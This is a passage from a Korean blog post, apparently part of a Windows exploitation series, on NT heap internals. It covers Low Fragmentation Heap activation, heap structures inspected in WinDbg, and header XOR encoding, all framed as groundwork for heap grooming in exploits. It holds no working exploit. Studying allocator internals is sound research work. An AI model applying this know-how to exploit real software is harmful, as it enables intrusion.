&#xB2E8;&#xD3B8;&#xD654; &#xC774;&#xC288;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; LFH&#xB97C; &#xB3C4;&#xC785;&#xD588;&#xACE0; vista&#xBD80;&#xD130; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xBA74;&#xC11C; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>LFH&#xB294; &#xB3D9;&#xC77C;&#xD55C; &#xD06C;&#xAE30;&#xC758; Heap &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC5EC;&#xB7EC; &#xBC88; &#xD560;&#xB2F9;&#xD558;&#xB2E4; &#xBCF4;&#xBA74; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xB429;&#xB2C8;&#xB2E4;. &#xAC04;&#xB2E8;&#xD55C; &#xD14C;&#xC2A4;&#xD2B8; &#xCF54;&#xB4DC;&#xB85C; &#xC5B4;&#xB290; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; LFH&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xB294;&#xC9C0; &#xBCFC;&#xAE4C;&#xC694;?</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CHUNK_SIZE 0x300</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">int</span> i;    LPVOID chunk;    HANDLE defaultHeap = GetProcessHeap();    <span class="hljs-keyword">int</span> prev_chunk = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++) {        chunk = HeapAlloc(defaultHeap, <span class="hljs-number">0</span>, CHUNK_SIZE);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] Chunk 0x%p   &quot;</span>, i, chunk);        <span class="hljs-keyword">if</span> (i != <span class="hljs-number">0</span>)            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;offset : %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)chunk - prev_chunk);        <span class="hljs-keyword">else</span>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);        prev_chunk = (<span class="hljs-keyword">int</span>)chunk;    }    system(<span class="hljs-string">&quot;PAUSE&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p><img src="Untitled 4.png" height="550px" width="500px"></p><p>&#xB3D9;&#xC77C;&#xD55C; &#xD06C;&#xAE30;&#xC758; Heap&#xC744; &#xC5F0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xD588;&#xC744; &#xB54C;&#xC758; &#xACB0;&#xACFC;&#xC785;&#xB2C8;&#xB2E4;. </p><ul><li>&#xC778;&#xB371;&#xC2A4; 0&#xACFC; 1&#xC744; &#xC81C;&#xC678;&#xD55C; &#xC778;&#xB371;&#xC2A4; 16&#xAE4C;&#xC9C0;&#xC758; chunk &#xC0AC;&#xC774; &#xAC70;&#xB9AC;&#xAC00; &#xC77C;&#xC815;&#xD568;</li><li>&#xC778;&#xB371;&#xC2A4; 17&#xBD80;&#xD130; chunk &#xAC04; &#xAC70;&#xB9AC;&#xAC00; &#xC77C;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xC74C;</li></ul><p>&#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xD669;&#xC5D0; &#xB530;&#xB77C; &#xC870;&#xAE08;&#xC529;&#xC758; &#xCC28;&#xC774;&#xB294; &#xC788;&#xC9C0;&#xB9CC; &#xB300;&#xBD80;&#xBD84; &#xC774;&#xB7EC;&#xD55C; &#xD2B9;&#xC131;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>chunk&#xAC00; LFH&#xC5D0; &#xC758;&#xD574; &#xAD00;&#xB9AC;&#xB418;&#xACE0; &#xC788;&#xB294;&#xC9C0;&#xB294; Windbg&#xC5D0;&#xC11C; &#xB2E4;&#xC74C; &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">!hepa -x [Chunk Address]</code></pre><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%205.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#xC778;&#xB371;&#xC2A4; 0 ~ 16 &#xC0AC;&#xC774; &#xC77C;&#xC815;&#xD55C; &#xAC70;&#xB9AC;&#xB85C; &#xD560;&#xB2F9;&#xB418;&#xB294; chunk&#xB4E4;&#xC740; LFH&#xB85C; &#xAD00;&#xB9AC;&#xB418;&#xC9C0; &#xC54A;&#xACE0;, &#xC778;&#xB371;&#xC2A4; 17&#xBD80;&#xD130; &#xBB34;&#xC791;&#xC704;&#xC758; &#xAC70;&#xB9AC;&#xB97C; &#xAC16;&#xB294; chunk&#xB294; LFH&#xB85C; &#xAD00;&#xB9AC;&#xB418;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC5EC;&#xAE30;&#xC11C; LFH&#xC758; &#xD2B9;&#xC9D5; &#xD55C; &#xAC00;&#xC9C0;&#xB97C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><blockquote><p>LFH&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xBA74; Heap Chunk &#xAC04; &#xAC70;&#xB9AC;&#xAC00; &#xBB34;&#xC791;&#xC704;&#xB85C; &#xD560;&#xB2F9;&#xB41C;&#xB2E4;.</p></blockquote><p>&#xC774;&#xB294; Windows&#xC5D0;&#xC11C; Exploit&#xC744; &#xC9C4;&#xD589;&#xD560; &#xB54C; Heap&#xC744; &#xC6D0;&#xD558;&#xB294; &#xB300;&#xB85C; &#xC138;&#xD305;&#xD558;&#xB294; Heap Grooming&#xC744; &#xB354; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4; reliable &#xD55C; exploit &#xC81C;&#xC791;&#xC744; &#xC5B4;&#xB835;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;. </p><ul><li>16KB(0x4000) &#xBCF4;&#xB2E4; &#xD070; Heap&#xC744; &#xD560;&#xB2F9;&#xD560; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; LFH&#xAC00; &#xAD00;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><h1 id="NT-Heap-Analysis"><a href="#NT-Heap-Analysis" class="headerlink" title="NT Heap Analysis"></a>NT Heap Analysis</h1><p>&#xC774;&#xC81C; NT Heap&#xC744; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC6B0;&#xC120; Heap &#xAD00;&#xB9AC;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC640; &#xC5ED;&#xD560;&#xC5D0; &#xB300;&#xD574; &#xC815;&#xB9AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="HEAP"><a href="#HEAP" class="headerlink" title="_HEAP"></a>_HEAP</h2><p>memory allocator&#xC758; &#xD575;&#xC2EC; &#xAD6C;&#xC870;&#xCCB4;&#xB85C;, &#xC804;&#xCCB4; Heap&#xC744; &#xAD00;&#xB9AC;&#xD560; &#xB54C; &#xC4F0;&#xC785;&#xB2C8;&#xB2E4;. &#xAD73;&#xC774; &#xBD84;&#xB958;&#xD558;&#xC790;&#xBA74; NT Heap&#xBCF4;&#xB2E4; &#xC0C1;&#xC704;&#xC758; &#xAD6C;&#xC870;&#xCCB4;&#xB85C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; Heap&#xC758; &#xC2DC;&#xC791;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB3D9;&#xC77C;&#xD55C; &#xD14C;&#xC2A4;&#xD2B8; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD55C; &#xB4A4; Windbg&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAC8C;&#xC694;. </p><p><img src="Untitled 6.png" height="560px" width="500px"></p><p>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; Heap List&#xB294; PEB&#xC758; <code>ProcessHeaps</code> &#xD544;&#xB4DC;&#xC5D0; &#xC704;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;. <code>dt _PEB @$peb</code> &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xBAA8;&#xB4E0; PEB &#xD544;&#xB4DC; &#xAC12;&#xC744; &#xCD9C;&#xB825;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs text">0:001&gt; dt _PEB @$pebntdll!_PEB   +0x000 InheritedAddressSpace : 0 &apos;&apos;   +0x001 ReadImageFileExecOptions : 0 &apos;&apos;   +0x002 BeingDebugged    : 0x1 &apos;&apos;   +0x003 BitField         : 0x4 &apos;&apos;   +0x003 ImageUsesLargePages : 0y0   +0x003 IsProtectedProcess : 0y0   +0x003 IsImageDynamicallyRelocated : 0y1   +0x003 SkipPatchingUser32Forwarders : 0y0   +0x003 IsPackagedProcess : 0y0   +0x003 IsAppContainer   : 0y0   +0x003 IsProtectedProcessLight : 0y0   +0x003 IsLongPathAwareProcess : 0y0   +0x004 Padding0         : [4]  &quot;&quot;   +0x008 Mutant           : 0xffffffff`ffffffff Void   +0x010 ImageBaseAddress : 0x00007ff6`c6c30000 Void   +0x018 Ldr              : 0x00007ff9`905b94c0 _PEB_LDR_DATA   +0x020 ProcessParameters : 0x000001cd`c8f922e0 _RTL_USER_PROCESS_PARAMETERS   +0x028 SubSystemData    : (null)    +0x030 ProcessHeap      : 0x000001cd`c8f90000 Void...</code></pre><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%207.png" alt></p><p>&#xB108;&#xBB34; &#xB9CE;&#xC73C;&#xB2C8; &#xC6B0;&#xB9AC;&#xAC00; &#xCC3E;&#xC73C;&#xB824;&#xB294; &#xD544;&#xB4DC;&#xBA85;&#xC73C;&#xB85C; &#xAC80;&#xC0C9;&#xD574;&#xBCF4;&#xC8E0;</p><pre><code class="hljs c">?? ((_PEB*) @$peb)-&gt;ProcessHeaps <span class="hljs-comment">// PEB-&gt;ProcessHeaps &#xD544;&#xB4DC;&#xAC12; &#xCD9C;&#xB825;</span></code></pre><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%208.png" alt></p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%209.png" alt></p><p><code>ProcessHeaps</code> &#xB294; <code>_Heap</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130; &#xBC30;&#xC5F4;&#xC744; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xD3EC;&#xC778;&#xD130; &#xBC30;&#xC5F4;&#xC5D0;&#xB294; Heap &#xC8FC;&#xC18C;&#xB4E4;&#xC774; &#xB098;&#xC5F4;&#xB418;&#xC5B4; &#xC788;&#xB124;&#xC694;. </p><p>&#xCCAB; &#xBC88;&#xC9F8; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAC8C;&#xC694;. <code>_HEAP</code> &#xC740;  <code>dt _HEAP [Address]</code> &#xB85C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs text">0:001&gt; dt _HEAP 000001cd`c8f90000ntdll!_HEAP   +0x000 Segment          : _HEAP_SEGMENT   +0x000 Entry            : _HEAP_ENTRY   +0x010 SegmentSignature : 0xffeeffee   +0x014 SegmentFlags     : 2   +0x018 SegmentListEntry : _LIST_ENTRY [ 0x000001cd`c8f90120 - 0x000001cd`c8f90120 ]...   +0x07c EncodeFlagMask   : 0x100000   +0x080 Encoding         : _HEAP_ENTRY   +0x090 Interceptor      : 0...   +0x138 BlocksIndex      : 0x000001cd`c8f902e8 Void   +0x140 UCRIndex         : (null)    +0x148 PseudoTagEntries : (null)    +0x150 FreeLists        : _LIST_ENTRY [ 0x000001cd`c8f95e10 - 0x000001cd`c8fab880 ]...   +0x198 FrontEndHeap     : 0x000001cd`c8f20000 Void   +0x1a0 FrontHeapLockCount : 0   +0x1a2 FrontEndHeapType : 0x2 &apos;&apos;   +0x1a3 RequestedFrontEndHeapType : 0x2 &apos;&apos;   +0x1a8 FrontEndHeapUsageData : 0x000001cd`c8f98210  &quot;&quot;   +0x1b0 FrontEndHeapMaximumIndex : 0x402   +0x1b2 FrontEndHeapStatusBitmap : [129]  &quot;x&quot;   +0x238 Counters         : _HEAP_COUNTERS   +0x2b0 TuningParameters : _HEAP_TUNING_PARAMETERS</code></pre><ul><li>0x7c EncodeFlagMask : Heap chunk header&#xAC00; &#xC778;&#xCF54;&#xB529; &#xB418;&#xC5C8;&#xB294;&#xC9C0;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xD544;&#xB4DC;. &#xCC98;&#xC74C; Heap&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD560; &#xB54C; <code>0x100000</code>&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB428;</li><li>0x080 Encoding : Heap header&#xC758; &#xBCC0;&#xC870;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; XOR &#xC778;&#xCF54;&#xB529;&#xC744; &#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB428;</li><li>0x138 BlocksIndex : <code>_HEAP_LIST_LOOKUP</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0B4;  <code>_HEAP_LIST_LOOKUP</code> &#xAD6C;&#xC870;&#xCCB4;&#xB294; Back-End&#xC5D0;&#xC11C; Heap chunk&#xB4E4;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB428;</li><li>0x150 FreeLists : &#xD560;&#xB2F9; &#xD574;&#xC81C;&#xB41C; Heap Chunk&#xB4E4;&#xC758; <code>_HEAP_ENTRY</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0B4;</li><li>0x198 FrontEndHeap : LFH&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0; &#xD560;&#xB2F9;&#xB41C; <code>_LFH_HEAP</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0B4;</li><li>0x1a2 FrontEndHeapType : LFH &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xBA70; <code>0x0</code> &#xC774;&#xBA74; &#xBE44;&#xD65C;&#xC131;&#xD654;, <code>0x2</code>&#xBA74; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;. <code>HeapQueryInformaton()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; LFH &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xAD6C;&#xBCC4;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB428;</li><li>0x1a8 FrontEndHeapUsageData : &#xD560;&#xB2F9;&#xB418;&#xB294; Chunk&#xC758; &#xC218;&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xBA70; &#xC77C;&#xC815; &#xC218;&#xC900;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xBA74; Front-End(LFH)&#xB97C; &#xD65C;&#xC131;&#xD654;</li></ul><p><code>FrontEndHeap</code>&#xC5D0; &#xC720;&#xD6A8;&#xD55C; &#xC8FC;&#xC18C; &#xAC12;&#xC774; &#xC788;&#xACE0; <code>FrontEndHeapType</code> &#xAC12;&#xC774; <code>0x2</code>&#xC778;&#xAC78;&#xB85C; LFH&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; Heap &#xBA54;&#xBAA8;&#xB9AC;&#xB4E4;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Back-End-Structure"><a href="#Back-End-Structure" class="headerlink" title="Back-End Structure"></a>Back-End Structure</h2><p>&#xC2E4;&#xC9C8;&#xC801;&#xC778; Heap&#xC758; &#xD560;&#xB2F9; &#xBC0F; &#xD574;&#xC81C;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; NT Heap&#xC758; Back-End &#xAD6C;&#xC870;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="HEAP-ENTRY"><a href="#HEAP-ENTRY" class="headerlink" title="_HEAP_ENTRY"></a>_HEAP_ENTRY</h3><p>&#xD560;&#xB2F9;&#xB41C; HEAP Chunk&#xC758; header &#xAD6C;&#xC870;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. &#xC55E;&#xC11C; <code>_HEAP</code>&#xC758; <code>Encoding</code> &#xD544;&#xB4DC; &#xC124;&#xBA85;&#xB300;&#xB85C; header&#xC758; &#xBCC0;&#xC870;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; XOR &#xC778;&#xCF54;&#xB529;&#xC744; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB514;&#xCF54;&#xB529; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCCD0;&#xC57C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>LFH&#xB85C; &#xAD00;&#xB9AC;&#xB418;&#xB294;&#xC9C0; &#xC544;&#xB2CC;&#xC9C0;&#xC5D0; &#xB530;&#xB77C; XOR &#xC778;&#xCF54;&#xB529; &#xBC29;&#xC2DD;&#xC774; &#xB2E4;&#xB974;&#xBA70; &#xC9C1;&#xC811; &#xB514;&#xCF54;&#xB529;&#xD574;&#xBCF4;&#xBA74;&#xC11C; <code>_HEAP_ENTRY</code> &#xAC12;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2010.png" alt></p><p>LFH&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC778;&#xB371;&#xC2A4; 0&#xC758; Chunk header&#xB294; <code>_Heap</code>&#xC758; Encode &#xD544;&#xB4DC;&#xC640; XOR &#xC5F0;&#xC0B0;&#xC73C;&#xB85C; &#xC778;&#xCF54;&#xB529; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xB450; &#xAC12;&#xC744; XOR &#xD55C; &#xACB0;&#xACFC;&#xB85C; <code>chunk+0x10</code>(16 bytes &#xB2E8;&#xC704;&#xC774;&#xBBC0;&#xB85C; 0x18&#xC744; &#xC218;&#xC815;)&#xC744; &#xC218;&#xC815;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB514;&#xCF54;&#xB529;&#xB41C; <code>_HEAP_ENTRY</code>&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2011.png" alt></p><h3 id="FreeLists-HEAP-ENTRY"><a href="#FreeLists-HEAP-ENTRY" class="headerlink" title="FreeLists(_HEAP_ENTRY)"></a>FreeLists(_HEAP_ENTRY)</h3><p>chunk&#xAC00; &#xD574;&#xC81C;&#xB418;&#xBA74; size&#xC5D0; &#xB530;&#xB77C; FreeList&#xC5D0; &#xBC30;&#xCE58;&#xB429;&#xB2C8;&#xB2E4;. </p><p>FreeLists&#xC758; &#xAD6C;&#xC870;&#xB294; glibc&#xC758; unstored bin&#xACFC; &#xC720;&#xC0AC;&#xD558;&#xBA70; &#xD574;&#xC81C;&#xB41C; chunk&#xC758; <code>_HEAP_ENTRY</code> &#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2012.png" alt></p><pre><code class="hljs text">0:001&gt; dx -r1 (*((ntdll!_LIST_ENTRY *)0x1cdc8f90150))(*((ntdll!_LIST_ENTRY *)0x1cdc8f90150))                 [Type: _LIST_ENTRY]    [+0x000] Flink            : 0x1cdc8f95e10 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8fab880 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8fab880)((ntdll!_LIST_ENTRY *)0x1cdc8fab880)                 : 0x1cdc8fab880 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8f90150 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8f94cd0 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8f94cd0)((ntdll!_LIST_ENTRY *)0x1cdc8f94cd0)                 : 0x1cdc8f94cd0 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8fab880 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8f95f40 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8f95f40)((ntdll!_LIST_ENTRY *)0x1cdc8f95f40)                 : 0x1cdc8f95f40 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8f94cd0 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8f951d0 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8f951d0)((ntdll!_LIST_ENTRY *)0x1cdc8f951d0)                 : 0x1cdc8f951d0 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8f95f40 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8fa7b30 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8fa7b30)((ntdll!_LIST_ENTRY *)0x1cdc8fa7b30)                 : 0x1cdc8fa7b30 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8f951d0 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8f93100 [Type: _LIST_ENTRY *]</code></pre><h3 id="HEAP-LIST-LOOKUP"><a href="#HEAP-LIST-LOOKUP" class="headerlink" title="_HEAP_LIST_LOOKUP"></a>_HEAP_LIST_LOOKUP</h3><p><code>_HEAP</code>&#xC758; <code>BlocksIndex</code>&#xD544;&#xB4DC;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xB85C; &#xB2E4;&#xC591;&#xD55C; &#xD06C;&#xAE30;&#xC758; &#xD574;&#xC81C;&#xB41C; chunk&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xC5B4; Best Fit &#xC815;&#xCC45;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; NT Heap&#xC5D0;&#xC11C; &#xC801;&#xC808;&#xD55C; chunk&#xB97C; &#xBE60;&#xB974;&#xAC8C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs text">0:001&gt; dt _HEAP_LIST_LOOKUP 0x000001cd`c8f902e8ntdll!_HEAP_LIST_LOOKUP   +0x000 ExtendedLookup   : 0x000001cd`c8f9ab70 _HEAP_LIST_LOOKUP   +0x008 ArraySize        : 0x80   +0x00c ExtraItem        : 0   +0x010 ItemCount        : 9   +0x014 OutOfRangeItems  : 0   +0x018 BaseIndex        : 0   +0x020 ListHead         : 0x000001cd`c8f90150 _LIST_ENTRY [ 0x000001cd`c8f95e10 - 0x000001cd`c8fab880 ]   +0x028 ListsInUseUlong  : 0x000001cd`c8f90320  -&gt; 0x18850   +0x030 ListHints        : 0x000001cd`c8f90330  -&gt; (null)</code></pre><ul><li>0x000 ExtendedLookup : &#xB2E4;&#xC74C; <code>_HEAP_LIST_LOOKUP</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0B4;</li><li>0x008 ArrySize : chunk&#xC758; &#xCD5C;&#xB300; &#xC0AC;&#xC774;&#xC988; &gt;&gt; 4 &#xB85C;, &#xC124;&#xC815;&#xB41C; &#xC2E4;&#xC81C; &#xCD5C;&#xB300; &#xC0AC;&#xC774;&#xC988;&#xB294; 0x800</li><li>0x010 ItemCount : &#xAD00;&#xB9AC; &#xC911;&#xC778; chunk&#xC758; &#xC218;</li><li>0x014 OutOfRangeItems : &#xCD5C;&#xB300; &#xAD00;&#xB9AC; &#xAC00;&#xB2A5;&#xD55C; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xB118;&#xC740; chunk&#xC758; &#xC218;</li><li>0x018 BaseIndex : <code>_HEAP_LIST_LOOKUP</code> &#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xB418;&#xB294; chunk&#xC758; &#xC2DC;&#xC791; index, ListHint&#xC5D0;&#xC11C; &#xC801;&#xC808;&#xD55C; &#xD06C;&#xAE30;&#xC758; &#xD574;&#xC81C;&#xB41C; chunk&#xB97C; &#xCC3E;&#xC744; &#xB54C;&#xB3C4; &#xC0AC;&#xC6A9;&#xB428;. &#xD604;&#xC7AC; BaseIndex&#xC758; &#xCD5C;&#xB313;&#xAC12;&#xC740; &#xB2E4;&#xC74C; BlocksIndex&#xC758; BaseIndex</li><li>0x020 ListHead : &#xD574;&#xC81C;&#xB41C; chunk list&#xC758; Head</li><li>0x028 ListsInUseUlong : ListHint&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; chunk&#xB4E4; &#xC911; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; chunk&#xB97C; &#xAC00;&#xB9AC;&#xD0B4;</li><li>0x030 ListHints : &#xC801;&#xC808;&#xD55C; &#xD06C;&#xAE30;&#xC758; chunk&#xB97C; &#xBE60;&#xB974;&#xAC8C; &#xCC3E;&#xAE30; &#xC704;&#xD55C; Back-End &#xD560;&#xB2F9;&#xC790;&#xC758; &#xD575;&#xC2EC;&#xC73C;&#xB85C; &#xAC19;&#xC740; &#xD06C;&#xAE30;&#xC758; &#xD574;&#xC81C;&#xB41C; chunk list&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C; &#xBC30;&#xC5F4;(&#xAC01; &#xC694;&#xC18C;&#xB294; 0x10 size)</li></ul><h2 id="Front-End-Structure"><a href="#Front-End-Structure" class="headerlink" title="Front-End Structure"></a>Front-End Structure</h2><p>Front-End&#xB294; Low Fragmentation Heap &#xACFC;&#xC815;&#xC774;&#xBA70; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xBC0F; &#xD574;&#xC81C;&#xC5D0; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xAD00;&#xC5EC;&#xD558;&#xC9C0;&#xB294; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="HEAP-USERDATA-HEADER"><a href="#HEAP-USERDATA-HEADER" class="headerlink" title="_HEAP_USERDATA_HEADER"></a>_HEAP_USERDATA_HEADER</h3><p>UserBlock&#xC758; header &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC774;&#xBA70; XOR &#xC5F0;&#xC0B0;&#xC73C;&#xB85C; &#xC778;&#xCF54;&#xB529; &#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. LFH chunk&#xB294;  <code>_HEAP_ENTRY</code> &#xC758; <code>SubSegmentCode</code> &#xD544;&#xB4DC;&#xC5D0; &#xC778;&#xCF54;&#xB529; &#xACB0;&#xAD0F;&#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. </p><p><img 